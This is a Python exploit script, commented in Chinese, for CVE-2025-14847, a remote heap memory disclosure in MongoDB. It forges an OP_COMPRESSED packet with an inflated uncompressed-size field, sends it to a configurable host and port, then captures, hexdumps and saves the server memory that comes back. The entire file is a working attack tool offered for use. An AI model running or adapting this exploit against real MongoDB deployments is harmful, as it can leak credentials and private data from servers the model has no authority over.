import socket
import struct
import zlib
import random
import sys

# === 配置参数 ===
TARGET_IP = "127.0.0.1"
TARGET_PORT = 27017
LEAK_SIZE = 65536  # 想要泄露的内存大小 (64KB)，建议范围 16KB - 256KB
# ================

def hexdump(data, length=16):
    """格式化打印内存数据，类似 Linux hexdump -C"""
    print(f"{'Offset':<10}  {'Hex':<47}  {'ASCII'}")
    print("-" * 75)
    for i in range(0, len(data), length):
        chunk = data[i:i + length]
        hex_part = " ".join(f"{b:02x}" for b in chunk)
        ascii_part = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
        print(f"{i:08x}:  {hex_part:<47}  |{ascii_part}|")

def build_malformed_packet(leak_size):
    """构造恶意的 OP_COMPRESSED 数据包"""
    
    # 1. 准备一个合法的原始 Payload (OP_QUERY 协议)
    # 查询: {"isMaster": 1}
    bson_payload = b'\x13\x00\x00\x00\x10isMaster\x00\x01\x00\x00\x00\x00'
    # OP_QUERY Header: flags(0) + collection("admin.$cmd") + nToSkip(0) + nToReturn(-1)
    op_query_header = struct.pack('<I', 0) + b'admin.$cmd\x00' + struct.pack('<ii', 0, -1)
    original_msg = op_query_header + bson_payload
    
    # 2. 正常压缩原始消息
    compressed_body = zlib.compress(original_msg)
    
    # 3. 构造恶意的 OP_COMPRESSED 字段
    # 漏洞核心：fake_uncompressed_size 被设定为巨大的值
    # 服务器会根据这个值分配堆内存，但实际解压出的数据很小，导致剩余内存块未被覆盖直接返回
    op_compressed_data = (
        struct.pack('<I', 2004) +            # originalOpcode: 2004 (OP_QUERY)
        struct.pack('<I', leak_size) +       # MALICIOUS: 声明的超大解压长度
        b'\x02' +                            # compressorId: 2 (zlib)
        compressed_body                      # 实际的压缩数据
    )
    
    # 4. 构造标准消息头 MsgHeader (16 字节)
    request_id = random.randint(1000, 9999)
    op_code = 2012  # 2012 代表 OP_COMPRESSED
    total_len = 16 + len(op_compressed_data)
    
    header = struct.pack('<iiii', total_len, request_id, 0, op_code)
    
    return header + op_compressed_data, request_id

def run_exploit():
    print(f"[*] CVE-2025-14847 MongoDB 远程堆内存泄露工具")
    print(f"[*] 目标: {TARGET_IP}:{TARGET_PORT}")
    print(f"[*] 尝试泄露大小: {LEAK_SIZE} bytes")
    
    try:
        # 创建连接
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((TARGET_IP, TARGET_PORT))
        print("[+] 成功连接至服务器")

        # 发送恶意包
        packet, req_id = build_malformed_packet(LEAK_SIZE)
        print(f"[*] 发送恶意 OP_COMPRESSED 数据包 (ID: {req_id})...")
        sock.sendall(packet)

        # 接收响应头
        resp_header = sock.recv(16)
        if not resp_header or len(resp_header) < 16:
            print("[-] 服务器未返回有效响应，可能不支持 zlib 或漏洞已修复")
            return

        resp_len, resp_id, resp_to, resp_opcode = struct.unpack('<iiii', resp_header)
        print(f"[+] 收到响应! 消息总长度: {resp_len} 字节")

        # 接收泄露的 Payload
        leaked_data = b''
        remaining = resp_len - 16
        while remaining > 0:
            chunk = sock.recv(min(8192, remaining))
            if not chunk: break
            leaked_data += chunk
            remaining -= len(chunk)

        print(f"[+] 成功捕获 {len(leaked_data)} 字节泄露的内存数据")
        print("=" * 75)
        
        # 打印 Hexdump 预览 (最后 1024 字节通常包含有趣的残留)
        print("[*] 内存 Dump 预览 (部分数据):")
        preview_size = 1024
        hexdump(leaked_data[-preview_size:])

        # 将全量泄露数据保存到文件，以便后续分析
        with open("leaked_memory.bin", "wb") as f:
            f.write(leaked_data)
        print(f"[*] 全量数据已保存至 leaked_memory.bin")

        sock.close()

    except ConnectionResetError:
        print("[-] 连接被重置。可能是 leak_size 过大触发了 MongoDB 的保护机制。")
    except Exception as e:
        print(f"[-] 发生错误: {e}")

if __name__ == "__main__":
    run_exploit()